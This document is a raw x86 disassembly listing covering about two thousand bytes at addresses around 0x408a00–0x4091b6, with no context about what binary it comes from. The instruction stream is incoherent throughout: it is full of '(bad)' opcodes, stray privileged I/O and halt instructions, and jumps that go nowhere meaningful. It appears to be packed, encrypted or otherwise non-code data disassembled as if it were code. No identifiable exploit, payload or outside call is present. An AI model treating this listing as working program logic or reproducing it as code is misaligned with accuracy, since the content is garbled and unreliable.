  4089dd:	aaa    
  4089de:	jl     0x4089a0
  4089e0:	fidivr DWORD PTR [edi+edi*2+0x7013c20e]
  4089e7:	loopne 0x4089b8
  4089e9:	stc    
  4089ea:	jns    0x4089b7
  4089ec:	adc    BYTE PTR [eax+0xbd800c2],bh
  4089f2:	retf   0x15f0
  4089f5:	mul    DWORD PTR [ebp-0x52]
  4089f8:	pop    edx
  4089f9:	push   edx
  4089fa:	fcomp  QWORD PTR ds:0xed2a4c5a
  408a00:	cli    
  408a01:	push   ecx
  408a02:	cs jb  0x408a40
  408a05:	rcl    DWORD PTR [eax-0x754353a0],0xb0
  408a0c:	and    ecx,DWORD PTR [edx+0x27]
  408a0f:	lods   al,BYTE PTR ds:[esi]
  408a10:	or     bl,bl
  408a12:	test   eax,0x4033e3a0
  408a17:	cld    
  408a18:	push   0x34cc54c7
  408a1d:	jns    0x4089e0
  408a1f:	(bad)  
  408a20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a21:	mov    bh,0x6b
  408a23:	mov    ebp,0x729c43b2
  408a28:	scas   al,BYTE PTR es:[edi]
  408a29:	fcomp  QWORD PTR [edx]
  408a2b:	hlt    
  408a2c:	add    eax,0xcffbfc90
  408a31:	rcl    DWORD PTR [ecx+0x1],cl
  408a34:	sub    DWORD PTR [esi+ebp*4+0x46],ecx
  408a38:	stc    
  408a39:	test   ebx,ecx
  408a3b:	es leave 
  408a3d:	jno    0x408a3a
  408a3f:	ret    
  408a40:	fsubr  QWORD PTR [ebx+eiz*1-0x3d]
  408a44:	sub    dl,ch
  408a46:	loopne 0x408a11
  408a48:	(bad)  
  408a4a:	es icebp 
  408a4c:	and    eax,0x1a6345a6
  408a51:	ficomp WORD PTR [esi+0x2]
  408a54:	and    ebx,DWORD PTR [edx-0xb445553]
  408a5a:	and    BYTE PTR [ebx+0x1],dh
  408a5d:	adc    DWORD PTR [esi],eax
  408a5f:	sbb    bl,BYTE PTR [eax+0x35]
  408a62:	cmp    eax,0x77a4c24b
  408a67:	jp     0x408ad6
  408a69:	xchg   ebp,eax
  408a6a:	xor    DWORD PTR [eax],esi
  408a6c:	xlat   BYTE PTR ds:[ebx]
  408a6d:	or     dl,al
  408a6f:	cmp    bl,bl
  408a71:	(bad)  
  408a72:	and    bl,BYTE PTR [edi]
  408a74:	in     eax,dx
  408a75:	adc    esi,DWORD PTR [ecx]
  408a77:	ds xchg edi,eax
  408a79:	or     DWORD PTR [eax+edi*1-0xc432912],0xffffff84
  408a81:	mov    bh,0x23
  408a83:	adc    dh,al
  408a85:	cmp    ecx,edi
  408a87:	pop    esp
  408a88:	mov    edi,0xacf170bf
  408a8d:	addr16 std 
  408a8f:	add    al,0x4c
  408a91:	cmp    DWORD PTR [ecx+edx*8+0x5d],edx
  408a95:	call   0xca81345c
  408a9a:	fstp   DWORD PTR [eax]
  408a9c:	dec    ecx
  408a9d:	and    al,0xbe
  408a9f:	test   eax,0x5fecbcfb
  408aa4:	fdivrp st(3),st
  408aa6:	addr16 sbb al,0xc7
  408aa9:	loope  0x408ace
  408aab:	ja     0x408aeb
  408aad:	pop    ds
  408aae:	jnp    0x408b25
  408ab0:	pushf  
  408ab1:	ins    DWORD PTR es:[edi],dx
  408ab2:	xor    eax,0x33a3d549
  408ab7:	scas   al,BYTE PTR es:[edi]
  408ab8:	mov    BYTE PTR [esp+ecx*2+0x158ad627],bh
  408abf:	cmp    dl,0x10
  408ac2:	or     edx,DWORD PTR [ebp+0x64f9d1d4]
  408ac8:	retf   
  408ac9:	mov    edi,esi
  408acb:	jg     0x408ae6
  408acd:	lahf   
  408ace:	adc    BYTE PTR [ebx],0x2e
  408ad1:	xor    al,0x21
  408ad3:	daa    
  408ad4:	pop    edi
  408ad5:	(bad)  
  408ad6:	ret    0x2e2
  408ad9:	daa    
  408ada:	loope  0x408aec
  408adc:	scas   al,BYTE PTR es:[edi]
  408add:	dec    edx
  408ade:	sbb    DWORD PTR [edi+0x1d6a5b9f],ebp
  408ae4:	addr16 inc ebp
  408ae6:	push   ebp
  408ae7:	mov    ?,WORD PTR [edx-0x16]
  408aea:	and    ebx,DWORD PTR [edi+eiz*8-0x225c7113]
  408af1:	shr    BYTE PTR [edi+eax*1-0x3dc4ecd0],0x5
  408af9:	(bad)  
  408afa:	sbb    BYTE PTR [edi+0x50],cl
  408afd:	pop    ds
  408afe:	ret    0xab16
  408b01:	or     al,0x7a
  408b03:	fs cmp al,0x1
  408b06:	add    ebx,DWORD PTR [eax+0x2c]
  408b09:	mov    esp,0xc1230577
  408b0e:	cmp    BYTE PTR [ecx+0x25e74af8],cl
  408b14:	and    esi,DWORD PTR [edi-0x70]
  408b17:	cwde   
  408b18:	xchg   esp,eax
  408b19:	cmp    DWORD PTR [edx],ebp
  408b1b:	mov    bl,0x0
  408b1d:	or     eax,0x59fa1b6
  408b22:	push   eax
  408b23:	cld    
  408b24:	nop
  408b25:	fs mov ebx,0x1b668583
  408b2b:	add    edx,esi
  408b2d:	xchg   ebx,eax
  408b2e:	xor    DWORD PTR [edi-0x2a],esp
  408b31:	dec    eax
  408b32:	sbb    BYTE PTR [ebx-0x1cf5e373],0x8c
  408b39:	mov    eax,ds:0xb06fe903
  408b3e:	repnz out dx,eax
  408b40:	cli    
  408b41:	push   eax
  408b42:	pop    edi
  408b43:	outs   dx,BYTE PTR ds:[esi]
  408b44:	inc    eax
  408b45:	sbb    al,0xcb
  408b47:	mov    esp,0xd8ba9887
  408b4c:	push   edi
  408b4d:	adc    esp,DWORD PTR [esi+0x1936aeeb]
  408b53:	sbb    al,0x23
  408b55:	xchg   edx,eax
  408b56:	push   esi
  408b57:	xor    DWORD PTR [ebx],0xffffffe4
  408b5a:	mov    al,ds:0x6135500a
  408b5f:	xor    bh,BYTE PTR [esp+edi*4-0x58e7a2e7]
  408b66:	(bad)  
  408b67:	adc    al,bh
  408b69:	inc    ecx
  408b6a:	sbb    eax,0xfdc71c3d
  408b6f:	jb     0x408b36
  408b71:	popa   
  408b72:	sbb    al,0x1d
  408b74:	outs   dx,DWORD PTR ds:[esi]
  408b75:	inc    esp
  408b76:	std    
  408b77:	push   edx
  408b78:	hlt    
  408b79:	sbb    DWORD PTR [esi],0x51076dfd
  408b7f:	sbb    eax,0xfe13b62b
  408b84:	jnp    0x408b3e
  408b86:	sahf   
  408b87:	adc    eax,0x2a474e9a
  408b8c:	dec    ebx
  408b8d:	clc    
  408b8e:	scas   al,BYTE PTR es:[edi]
  408b8f:	push   ebp
  408b90:	mov    ah,BYTE PTR [esi+0x57]
  408b93:	add    bl,BYTE PTR [ebx-0x20]
  408b96:	mov    esi,0xa7767a5d
  408b9b:	add    ch,BYTE PTR [ebx+0x6a5d4ee0]
  408ba1:	jbe    0x408b5a
  408ba3:	add    bh,BYTE PTR [ebx+0x5a5c5ee0]
  408ba9:	or     cl,BYTE PTR [edx]
  408bab:	dec    eax
  408bac:	and    eax,0x4aa14557
  408bb1:	mov    ah,0x97
  408bb3:	(bad)  
  408bb4:	fwait
  408bb5:	push   esp
  408bb6:	jle    0x408b81
  408bb8:	cmp    al,BYTE PTR ds:0x9c32fe7
  408bbe:	shr    BYTE PTR [edx],0x38
  408bc1:	retf   
  408bc2:	xchg   esi,eax
  408bc3:	je     0x408bb8
  408bc5:	repz adc bl,BYTE PTR [eax+0x3c]
  408bc9:	test   BYTE PTR [esp+eax*8+0x0],bh
  408bcd:	mov    bh,0x3
  408bcf:	xchg   edx,eax
  408bd0:	adc    cl,BYTE PTR [esi-0x1d]
  408bd3:	jmp    0x2dda:0x69c23d1c
  408bda:	fild   DWORD PTR [edi]
  408bdc:	fcmovu st,st(4)
  408bde:	jmp    DWORD PTR [ecx-0x214f56a7]
  408be4:	sbb    DWORD PTR [ebp+eiz*8-0x2e],0xffffffb0
  408be9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bea:	and    ecx,DWORD PTR [ebp+edi*2-0x73dbcfbf]
  408bf1:	jge    0x408c09
  408bf3:	icebp  
  408bf4:	mov    al,ds:0xaa51cc4
  408bf9:	out    0x2a,al
  408bfb:	push   0x50f8f623
  408c00:	mov    eax,0xc9489dc8
  408c05:	adc    ebx,DWORD PTR [esi+0x1268191f]
  408c0b:	data16 jle 0x408c6b
  408c0e:	ret    0x8c3c
  408c11:	ss sub al,bl
  408c14:	add    al,0x47
  408c16:	ret    
  408c17:	scas   al,BYTE PTR es:[edi]
  408c18:	test   BYTE PTR [edi+0x5065d74f],0x15
  408c1f:	adc    bh,ch
  408c21:	mov    eax,0x9f1699dc
  408c26:	loop   0x408c60
  408c28:	mov    bh,BYTE PTR [ebx+0x45]
  408c2b:	(bad)  
  408c2c:	xor    al,0x34
  408c2e:	sahf   
  408c2f:	adc    edi,edx
  408c31:	mov    esp,0x2554652b
  408c36:	mov    al,0xff
  408c38:	mov    dl,0x52
  408c3a:	dec    ebx
  408c3b:	lock ins BYTE PTR es:[edi],dx
  408c3d:	out    0x72,al
  408c3f:	retf   
  408c40:	sbb    BYTE PTR [edi+0x11862f3],cl
  408c46:	add    BYTE PTR [eax],0x63
  408c49:	test   DWORD PTR [ecx-0x19],ebp
  408c4c:	xchg   esi,eax
  408c4d:	lods   eax,DWORD PTR ds:[esi]
  408c4e:	aad    0xce
  408c50:	std    
  408c51:	add    dl,BYTE PTR [ebp-0x1c73eb8e]
  408c57:	sub    ebx,DWORD PTR [esi+0x4b49c7a7]
  408c5d:	adc    ebp,DWORD PTR [ebx]
  408c5f:	cmp    eax,0xca431cb5
  408c64:	scas   eax,DWORD PTR es:[edi]
  408c65:	inc    ebx
  408c66:	sub    BYTE PTR [ebp-0x6],cl
  408c69:	int3   
  408c6a:	mov    ebx,0xc90977e0
  408c6f:	ret    
  408c70:	jmp    0x6e7ae4fa
  408c75:	es int 0x93
  408c78:	fnstcw WORD PTR [edi+edi*1+0x5fb51b31]
  408c7f:	sbb    ah,bh
  408c81:	push   esp
  408c82:	mov    ebp,0xc233bcd7
  408c87:	sbb    BYTE PTR [eax+ecx*1],dh
  408c8a:	daa    
  408c8b:	push   0x4f
  408c8d:	mov    bl,0x74
  408c8f:	push   0x8b0f8587
  408c94:	or     al,BYTE PTR ds:0x49f92070
  408c9a:	push   esp
  408c9b:	push   esp
  408c9c:	and    ebp,DWORD PTR [ebx+0x74]
  408c9f:	stos   BYTE PTR es:[edi],al
  408ca0:	ins    DWORD PTR es:[edi],dx
  408ca1:	fucomp st(2)
  408ca3:	test   al,0xcf
  408ca5:	adc    ecx,ebp
  408ca7:	lods   al,BYTE PTR ds:[esi]
  408ca8:	lods   al,BYTE PTR ds:[esi]
  408ca9:	inc    ebp
  408caa:	out    0xa3,al
  408cac:	cwde   
  408cad:	pop    ebp
  408cae:	mov    dl,0xb
  408cb0:	cli    
  408cb1:	ja     0x408ce9
  408cb3:	jp     0x408d31
  408cb5:	call   0xa450:0x8eb7c899
  408cbc:	xor    al,0x1d
  408cbe:	lds    eax,FWORD PTR [ecx]
  408cc0:	and    eax,0xa1e5a9b5
  408cc5:	dec    ebp
  408cc6:	int3   
  408cc7:	out    dx,eax
  408cc8:	mov    bl,0xb7
  408cca:	xor    cl,dh
  408ccc:	jbe    0x408cc7
  408cce:	fwait
  408ccf:	sbb    BYTE PTR [esi-0x79001809],dh
  408cd5:	dec    ecx
  408cd6:	lods   al,BYTE PTR ds:[esi]
  408cd7:	inc    DWORD PTR [esi]
  408cd9:	test   DWORD PTR [eax],esp
  408cdb:	test   eax,0xa46257d4
  408ce0:	sti    
  408ce1:	xor    BYTE PTR cs:[ebx+0x6e],bl
  408ce5:	mov    dl,0xff
  408ce7:	jne    0x408d19
  408ce9:	inc    esp
  408cea:	popa   
  408ceb:	push   ds
  408cec:	sti    
  408ced:	push   ss
  408cee:	cld    
  408cef:	mov    dl,0xc8
  408cf1:	mov    edx,0x3d0a55c7
  408cf6:	mov    cl,bh
  408cf8:	int    0xb5
  408cfa:	pop    esi
  408cfb:	cmp    ah,BYTE PTR [edx-0x4199fbde]
  408d01:	mov    bh,0x24
  408d03:	outs   dx,DWORD PTR ds:[esi]
  408d04:	adc    BYTE PTR [edi],bh
  408d06:	mul    ah
  408d08:	fst    st(7)
  408d0a:	pusha  
  408d0b:	call   0xd4266926
  408d10:	mov    ebp,0x390c4320
  408d15:	pop    edi
  408d16:	jmp    0x8fac3bca
  408d1b:	cmp    DWORD PTR [ebp+eax*1+0x2e66fe59],esp
  408d22:	or     bl,BYTE PTR fs:[ebp+eiz*8-0x3e]
  408d27:	retf   
  408d28:	jns    0x408d5a
  408d2a:	lahf   
  408d2b:	xlat   BYTE PTR ds:[ebx]
  408d2c:	or     DWORD PTR ds:0x85ffddc4,0xffffffff
  408d33:	(bad)  
  408d34:	clc    
  408d35:	mov    eax,ds:0x27275501
  408d3a:	and    edi,DWORD PTR [edi-0xd]
  408d3d:	mov    edi,0xc29cfbeb
  408d42:	loop   0x408d35
  408d44:	push   eax
  408d45:	scas   al,BYTE PTR es:[edi]
  408d46:	sub    bh,ch
  408d48:	ror    BYTE PTR [eax],cl
  408d4a:	popa   
  408d4b:	jmp    FWORD PTR [eax]
  408d4d:	(bad)  [edi+ebx*4]
  408d50:	inc    ebp
  408d51:	fsub   DWORD PTR [ebx-0x7a8cf54a]
  408d57:	or     ecx,esi
  408d59:	aas    
  408d5a:	add    DWORD PTR [ecx],0xffffffb0
  408d5d:	xchg   esp,eax
  408d5e:	jecxz  0x408d3a
  408d60:	in     eax,dx
  408d61:	arpl   WORD PTR [edx-0x67],dx
  408d64:	sub    edx,DWORD PTR [edi]
  408d66:	xor    al,BYTE PTR [edi]
  408d68:	jnp    0x408cef
  408d6a:	and    ch,BYTE PTR [edi+0x146c9796]
  408d70:	in     eax,dx
  408d71:	inc    esi
  408d72:	and    BYTE PTR [esi+eax*8-0x29],ch
  408d76:	xchg   esi,eax
  408d77:	jmp    0xbe3cc2e8
  408d7c:	xor    ebp,0xeb93a9cf
  408d82:	pop    edx
  408d83:	shl    BYTE PTR [edi+0x31627f33],0x16
  408d8a:	cmp    al,0x6
  408d8c:	inc    edi
  408d8d:	cwde   
  408d8e:	jmp    FWORD PTR [esi]
  408d90:	or     bl,dl
  408d92:	inc    ebx
  408d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d94:	push   es
  408d95:	sbb    eax,0xce96a9a3
  408d9a:	out    dx,eax
  408d9b:	add    BYTE PTR [ecx-0x800edee],bl
  408da1:	cmc    
  408da2:	inc    esi
  408da3:	and    BYTE PTR [ebx],0x8b
  408da6:	mov    ebx,0x8414c265
  408dab:	xor    DWORD PTR [ebx+0x69916a13],ebx
  408db1:	shr    DWORD PTR [ebx-0x50],0xbf
  408db5:	jbe    0x408d79
  408db7:	xor    eax,0xd6f90a76
  408dbc:	push   ecx
  408dbd:	cmp    cl,BYTE PTR [edi-0x52]
  408dc0:	xchg   edx,eax
  408dc1:	sbb    BYTE PTR [ebx-0x1f48a3a1],dl
  408dc7:	jns    0x408dc3
  408dc9:	pop    eax
  408dca:	fdivr  DWORD PTR [ebp-0x46]
  408dcd:	hlt    
  408dce:	xor    DWORD PTR [edx-0x221d7a62],ebx
  408dd4:	lds    ecx,FWORD PTR [esi]
  408dd6:	ss or  ebx,esp
  408dd9:	and    DWORD PTR [ebx],esp
  408ddb:	sbb    al,0x3f
  408ddd:	and    ebp,ecx
  408ddf:	jb     0x408e2a
  408de1:	data16 (bad) 
  408de3:	jecxz  0x408db0
  408de5:	mov    bl,cl
  408de7:	cmp    cl,BYTE PTR [ebp+0x2bd12b7d]
  408ded:	ds out dx,al
  408def:	out    dx,al
  408df0:	mov    ebx,0x6fc02a85
  408df5:	adc    ebx,0x6b2339f2
  408dfb:	ret    
  408dfc:	xor    ch,BYTE PTR [ebx+eiz*8-0x6e]
  408e00:	fmulp  st(3),st
  408e02:	jl     0x408e17
  408e04:	push   ebx
  408e05:	shl    BYTE PTR [edx-0x405a405b],1
  408e0b:	xchg   ecx,eax
  408e0c:	daa    
  408e0d:	add    bl,dl
  408e0f:	pushf  
  408e10:	(bad)  
  408e11:	hlt    
  408e12:	das    
  408e13:	xlat   BYTE PTR ds:[ebx]
  408e14:	stos   DWORD PTR es:[edi],eax
  408e15:	xor    ah,BYTE PTR [edi]
  408e17:	mov    ebp,0xd329528
  408e1c:	or     BYTE PTR [ebx],ch
  408e1e:	push   ds
  408e1f:	xchg   esi,eax
  408e20:	std    
  408e21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e22:	xlat   BYTE PTR ds:[ebx]
  408e23:	adc    DWORD PTR [ebp+0x1eeacc63],0xfba0ef7d
  408e2d:	add    dh,BYTE PTR [edx+esi*1]
  408e30:	fcomp  QWORD PTR [ebx+edx*4-0x212d3b20]
  408e37:	lahf   
  408e38:	jno    0x408e56
  408e3a:	xor    al,BYTE PTR [edx+0x30d19b72]
  408e40:	jns    0x408dd1
  408e42:	mov    eax,ds:0x227a078d
  408e47:	mov    eax,0x324bb6
  408e4c:	sub    eax,0x61beca28
  408e51:	mov    ds:0x3983d12f,eax
  408e56:	mov    dl,0x60
  408e58:	mov    cl,BYTE PTR [edx-0x56cde2b9]
  408e5e:	jb     0x408e90
  408e60:	or     BYTE PTR [edx+esi*1+0x2f],0xe2
  408e65:	std    
  408e66:	mov    dh,BYTE PTR [edx]
  408e68:	jmp    0x408e15
  408e6a:	aas    
  408e6b:	in     al,dx
  408e6c:	xor    bh,BYTE PTR [ebx]
  408e6e:	cli    
  408e6f:	fcmovnbe st,st(2)
  408e71:	pushf  
  408e72:	stos   DWORD PTR es:[edi],eax
  408e73:	cmp    BYTE PTR [edx],dh
  408e75:	retf   
  408e76:	mov    ds:0xefac6ad0,al
  408e7b:	loope  0x408e9b
  408e7d:	mov    ds:0xa5be5f46,al
  408e82:	das    
  408e83:	xor    DWORD PTR [ebx+0x2],ebx
  408e86:	packsswb mm7,QWORD PTR [ebx]
  408e89:	jmp    0x1e190c0
  408e8e:	dec    esi
  408e8f:	dec    esi
  408e90:	jmp    0x408ec1
  408e92:	jmp    0x408e64
  408e94:	outs   dx,DWORD PTR ds:[esi]
  408e95:	sub    BYTE PTR [ebp+0x2d],0x64
  408e99:	lods   eax,DWORD PTR ds:[esi]
  408e9a:	sbb    esp,eax
  408e9c:	xchg   edi,eax
  408e9d:	cmp    esi,eax
  408e9f:	push   ds
  408ea0:	or     DWORD PTR [ebx+0x4101b90f],eax
  408ea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ea7:	mov    edi,0x319bc9c2
  408eac:	xor    dh,BYTE PTR [esi+0x5a]
  408eaf:	mov    ah,0x1a
  408eb1:	cmp    ebp,edi
  408eb3:	loopne 0x408e7e
  408eb5:	retf   
  408eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eb7:	sbb    ch,bl
  408eb9:	xor    al,0x82
  408ebb:	xchg   esp,eax
  408ebc:	mov    eax,DWORD PTR [edx]
  408ebe:	xor    eax,0x32f97ae2
  408ec3:	shr    bh,1
  408ec5:	jbe    0x408e79
  408ec7:	mov    edi,0x61106579
  408ecc:	or     ebx,edi
  408ece:	sar    DWORD PTR [edx+0xb],cl
  408ed1:	mov    cl,0x88
  408ed3:	mov    cl,0x5c
  408ed5:	inc    ebx
  408ed6:	dec    ebx
  408ed7:	loopne 0x408e9f
  408ed9:	or     edi,DWORD PTR [edx]
  408edb:	or     DWORD PTR [ebx+eax*1],eax
  408ede:	push   ebp
  408edf:	mov    bh,BYTE PTR [edx-0x291f1793]
  408ee5:	xor    eax,0xe3eb0ebc
  408eea:	inc    ecx
  408eeb:	push   eax
  408eec:	mov    bh,0x2
  408eee:	xchg   ah,dh
  408ef0:	jbe    0x408f00
  408ef2:	adc    eax,0xd38338cd
  408ef7:	ficomp WORD PTR [edx-0xb]
  408efa:	es mov ch,0x4b
  408efd:	jge    0x408f21
  408eff:	mov    edx,0x6aad51a
  408f04:	mov    edx,0x33bf86d2
  408f09:	inc    esp
  408f0a:	and    eax,0x5002e343
  408f0f:	and    bl,BYTE PTR [edx-0x44a7f86c]
  408f15:	and    edx,DWORD PTR [eax-0x41]
  408f18:	xchg   edx,eax
  408f19:	leave  
  408f1a:	add    ecx,edi
  408f1c:	xor    bl,BYTE PTR [esi-0x182720e2]
  408f22:	add    esp,eax
  408f24:	(bad)  ds:0x65f5be44
  408f2a:	out    dx,eax
  408f2b:	loopne 0x408ef1
  408f2d:	jb     0x408f51
  408f2f:	(bad)  
  408f30:	jmp    0x408f0a
  408f32:	out    0x21,al
  408f34:	jmp    0x4076953b
  408f39:	jecxz  0x408f6d
  408f3b:	xor    dl,BYTE PTR [edx-0x6f40858a]
  408f41:	enter  0x41a3,0x32
  408f45:	and    eax,eax
  408f47:	call   0xd48c143a
  408f4c:	stos   DWORD PTR es:[edi],eax
  408f4d:	call   0x11bb:0x9488a297
  408f54:	xor    al,0xdb
  408f56:	push   edx
  408f57:	mov    ch,dl
  408f59:	push   ebp
  408f5a:	mov    edx,0x738af0e0
  408f5f:	dec    esi
  408f60:	jmp    0x408f79
  408f62:	jo     0x408fcd
  408f64:	jmp    0x408f91
  408f66:	rcr    esp,cl
  408f68:	ficomp WORD PTR [ebx-0x4ccd3dd5]
  408f6e:	mov    dh,0x6f
  408f70:	xor    edx,DWORD PTR [edx+eiz*2-0x2c607429]
  408f77:	cli    
  408f78:	stc    
  408f79:	sub    eax,0xf9323da7
  408f7e:	xlat   BYTE PTR ds:[ebx]
  408f7f:	xor    DWORD PTR cs:[ebp+ebx*2+0x5b4355b0],edx
  408f87:	mov    edi,0xe21b24ef
  408f8c:	inc    ebx
  408f8d:	xchg   ecx,eax
  408f8e:	fsubr  st,st(5)
  408f90:	add    BYTE PTR [edi+0x1f92bc32],dh
  408f96:	in     al,0x57
  408f98:	pop    ebx
  408f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f9a:	xlat   BYTE PTR ds:[ebx]
  408f9b:	rcl    BYTE PTR [ebx-0x4e],cl
  408f9e:	mov    dh,BYTE PTR [ecx-0x5e7e023a]
  408fa4:	and    eax,0xafbf6ec9
  408fa9:	mov    BYTE PTR [ebx+0x50020902],al
  408faf:	push   cs
  408fb0:	sahf   
  408fb1:	sbb    eax,0x836bf632
  408fb6:	push   edi
  408fb7:	cdq    
  408fb8:	pop    eax
  408fb9:	mov    bl,0xa3
  408fbb:	loopne 0x408fdc
  408fbd:	pop    ebx
  408fbe:	sar    DWORD PTR [esi-0x62],cl
  408fc1:	xchg   esp,eax
  408fc2:	(bad)  
  408fc3:	bound  ecx,QWORD PTR [ebx+0x65bff04f]
  408fc9:	mov    ah,0x6f
  408fcb:	(bad)  
  408fcd:	add    DWORD PTR [ecx-0x7c],eax
  408fd0:	jmp    0x408ff8
  408fd2:	sbb    DWORD PTR [eax-0x1739fdc5],0xffffffcb
  408fd9:	inc    edi
  408fda:	mov    ds:0xc6fb24d3,eax
  408fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fe0:	jecxz  0x408f76
  408fe2:	in     eax,0x68
  408fe4:	jb     0x408fc1
  408fe6:	shl    DWORD PTR [esi+0x33053de8],cl
  408fec:	xchg   esi,eax
  408fed:	jbe    0x409061
  408fef:	mov    edi,0x69abc951
  408ff4:	xor    dh,cl
  408ff6:	popa   
  408ff7:	(bad)  
  408ff8:	fcom   DWORD PTR [edx+ebp*2+0x4bf6abb5]
  408fff:	cs call 0x5b6a157f
  409005:	add    ah,BYTE PTR [esi+eiz*8+0x632e13b]
  40900c:	jo     0x408fe1
  40900e:	xchg   esi,eax
  40900f:	cdq    
  409010:	jmp    0x409052
  409012:	add    bl,BYTE PTR [ecx]
  409014:	mov    al,0xef
  409016:	mov    ?,WORD PTR [esi-0x26]
  409019:	xchg   esp,eax
  40901a:	test   BYTE PTR [ecx],bh
  40901c:	repnz pop es
  40901e:	pop    ebx
  40901f:	fucomp st(3)
  409021:	lea    esi,[ecx]
  409023:	scas   eax,DWORD PTR es:[edi]
  409024:	jmp    0x409049
  409026:	ds (bad) 
  409028:	jnp    0x409031
  40902a:	sbb    eax,0xf1ebfd72
  40902f:	mov    edi,0xd3d32480
  409034:	xor    al,BYTE PTR [eax]
  409036:	xchg   BYTE PTR [esi-0x1c],al
  409039:	or     al,0xc3
  40903b:	loop   0x409095
  40903d:	and    edi,esp
  40903f:	(bad)  
  409040:	jmp    0x409078
  409042:	test   DWORD PTR [ebx],ebp
  409044:	jecxz  0x409048
  409046:	xchg   dl,bl
  409048:	dec    esi
  409049:	or     al,0x10
  40904b:	xchg   ebp,eax
  40904c:	sbb    edi,DWORD PTR [ebx+0x14e0bf0e]
  409052:	mov    edi,0xd3824678
  409057:	ds (bad) 
  409059:	ret    
  40905a:	sbb    edi,DWORD PTR [ebp+0xe666c32]
  409060:	jl     0x40900f
  409062:	jbe    0x408fe9
  409064:	inc    ebx
  409065:	adc    dl,0xc6
  409068:	(bad)  
  40906a:	sub    DWORD PTR [eax+0x67],ebp
  40906d:	add    bl,BYTE PTR [ebp+0x3f]
  409070:	imul   edi,DWORD PTR [ebp+0x3f324b11],0xffffffe6
  409077:	repnz mov dl,0xa5
  40907a:	mov    cl,0xdb
  40907c:	outs   dx,DWORD PTR ds:[esi]
  40907d:	push   ebx
  40907e:	into   
  40907f:	mov    edi,0x43dd3326
  409084:	xor    ch,BYTE PTR [esi]
  409086:	pusha  
  409087:	jle    0x409093
  409089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40908a:	xchg   edx,eax
  40908b:	jno    0x409054
  40908d:	mov    dl,bl
  40908f:	adc    ebp,DWORD PTR [ebx+0x5d]
  409092:	rcr    DWORD PTR [ebp-0x40ed88fd],0x9a
  409099:	int    0xeb
  40909b:	arpl   WORD PTR [eax],ax
  40909d:	pop    edi
  40909e:	sbb    ch,BYTE PTR [edx-0x15]
  4090a1:	arpl   WORD PTR [edx-0x74afcecf],bp
  4090a7:	in     al,0x5e
  4090a9:	adc    BYTE PTR [edx],dh
  4090ab:	scas   eax,DWORD PTR es:[edi]
  4090ac:	mov    bl,0x20
  4090ae:	pop    esi
  4090af:	mov    edi,0x61a2a74d
  4090b4:	push   0xffffffb1
  4090b6:	repnz pushf 
  4090b8:	jb     0x40904e
  4090ba:	enter  0x1b98,0x93
  4090be:	push   edi
  4090bf:	mov    edi,0x85103d0b
  4090c4:	xor    al,ch
  4090c6:	loopne 0x409107
  4090c8:	xchg   esi,eax
  4090c9:	sbb    al,0x73
  4090cb:	call   0xbc7e9317
  4090d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d1:	mov    eax,ds:0x8a77b98e
  4090d6:	pop    eax
  4090d7:	push   DWORD PTR [edx+0x5b15f697]
  4090dd:	fcmovbe st,st(3)
  4090df:	jle    0x4090bd
  4090e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090e2:	aas    
  4090e3:	loopne 0x409153
  4090e5:	enter  0x97e2,0x6
  4090e9:	pop    ebp
  4090ea:	repz popa 
  4090ec:	mov    ebx,0xa9bf3221
  4090f1:	mov    eax,ds:0x623ebdc7
  4090f6:	push   ds
  4090f7:	(bad)  
  4090f8:	jmp    0x4090a8
  4090fa:	add    ah,BYTE PTR [ecx]
  4090fc:	stos   BYTE PTR es:[edi],al
  4090fd:	sbb    DWORD PTR [ebx+0x2f],0x954e943e
  409104:	or     DWORD PTR [ebx-0x4b9440f2],0xffffffaf
  40910b:	jnp    0x4090bf
  40910d:	sbb    eax,DWORD PTR [edx+0x37]
  409110:	jmp    0x409124
  409112:	add    al,BYTE PTR [ebp-0x401f17d0]
  409118:	xchg   edx,eax
  409119:	shl    DWORD PTR [eax-0x2c20bca7],1
  40911f:	mov    ds:0x90aad18b,al
  409124:	mov    dl,0x22
  409126:	mov    cl,BYTE PTR [ecx+eiz*1+0x1433078]
  40912d:	add    bh,dl
  40912f:	retf   0x4de
  409132:	(bad)  
  409134:	lahf   
  409135:	mov    ch,0xb2
  409137:	mov    dl,0xeb
  409139:	enter  0x539b,0x11
  40913d:	pop    ds
  40913e:	ror    DWORD PTR [eax+0x5d],cl
  409141:	and    eax,0x3303cbcf
  409146:	dec    edx
  409147:	retf   0x941e
  40914a:	std    
  40914b:	mov    ecx,0x8c0582ff
  409150:	cs int3 
  409152:	adc    al,0x9
  409154:	adc    ebx,eax
  409156:	rcl    DWORD PTR [ebx+esi*4],cl
  409159:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40915a:	jmp    0x4091bf
  40915c:	xor    ah,BYTE PTR [eax-0x72]
  40915f:	mov    esi,0x3b32943a
  409164:	(bad)  
  409165:	mov    ds:0xcd52caf2,eax
  40916a:	mov    ebx,0x53248360
  40916f:	mov    edi,0x49361132
  409174:	mov    edx,0x7f37b202
  409179:	shl    DWORD PTR [edx],1
  40917b:	mov    dl,0x11
  40917d:	jnp    0x409126
  40917f:	mov    edi,0xe17356ed
  409184:	or     DWORD PTR [edx],eax
  409186:	or     DWORD PTR [esi],esi
  409188:	pushf  
  409189:	lea    esi,[edx]
  40918b:	aam    0x72
  40918d:	xor    edi,DWORD PTR [esi]
  40918f:	mov    bl,0x9d
  409191:	mov    DWORD PTR [edx+0x4a55aa1d],0xa8941ecb
  40919b:	mov    ebp,0xa5d3d7bb
  4091a0:	ss je  0x409142
  4091a3:	loopne 0x409168
  4091a5:	(bad)  
  4091a7:	push   ds
  4091a8:	in     eax,dx
  4091a9:	out    0xe3,al
  4091ab:	push   ebp
  4091ac:	adc    DWORD PTR [edx],eax
  4091ae:	xor    bh,bl
  4091b0:	bound  esp,QWORD PTR [eax-0x641442a5]
  4091b6:	rol    ebx,cl
